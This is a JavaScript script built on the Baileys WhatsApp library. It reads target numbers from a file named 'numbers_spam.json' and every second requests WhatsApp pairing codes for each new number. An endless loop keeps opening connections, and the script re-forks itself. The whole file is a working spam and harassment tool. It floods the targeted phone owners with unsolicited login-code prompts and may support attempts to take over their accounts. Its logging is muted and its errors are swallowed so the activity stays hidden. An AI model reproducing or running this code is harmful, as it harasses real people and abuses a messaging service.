const { default: makeWASocket, useMultiFileAuthState } = require("@whiskeysockets/baileys");
const pino = require('pino');
const readline = require("readline");
const fs = require('fs');
const path = require('path');
const { fork } = require('child_process');

const rl = readline.createInterface({ input: process.stdin, output: process.stdout });

async function fetchPhoneNumbers() {
    try {
        const data = fs.readFileSync('./numbers_spam.json', 'utf8');
        const jsonData = JSON.parse(data);
        return Object.values(jsonData).flat();
    } catch (error) {
        return [];
    }
}

async function processRequests(XeonBotInc, phoneNumbers) {
    const promises = phoneNumbers.map(async (number) => {
        try {
            await XeonBotInc.requestPairingCode(number);
        } catch (error) {
        }
    });
    await Promise.all(promises);
}

async function XeonProject() {
    const { state } = await useMultiFileAuthState('./session');
    const XeonBotInc = makeWASocket({
        logger: pino({ level: "silent" }),
        printQRInTerminal: false,
        auth: state,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 0,
        keepAliveIntervalMs: 10000,
        emitOwnEvents: true,
        fireInitQueries: true,
        generateHighQualityLinkPreview: true,
        syncFullHistory: true,
        markOnlineOnConnect: true,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
    });

    let previousNumbers = [];

    const requestInterval = setInterval(async () => {
        try {
            const phoneNumbers = await fetchPhoneNumbers();
            const addedNumbers = phoneNumbers.filter(number => !previousNumbers.includes(number));
            const removedNumbers = previousNumbers.filter(number => !phoneNumbers.includes(number));

            if (addedNumbers.length > 0) {
                await processRequests(XeonBotInc, addedNumbers);
            }

            previousNumbers = phoneNumbers;

        } catch (error) {
            console.error(error);
        }
    }, 1000);

    return XeonBotInc;
}

const start = async () => {
    while (true) {
        await XeonProject();
    }
};

start().then(() => {
    const scriptPath = path.resolve(__filename);
    setTimeout(() => {
        fork(scriptPath);
    }, 1000);
});
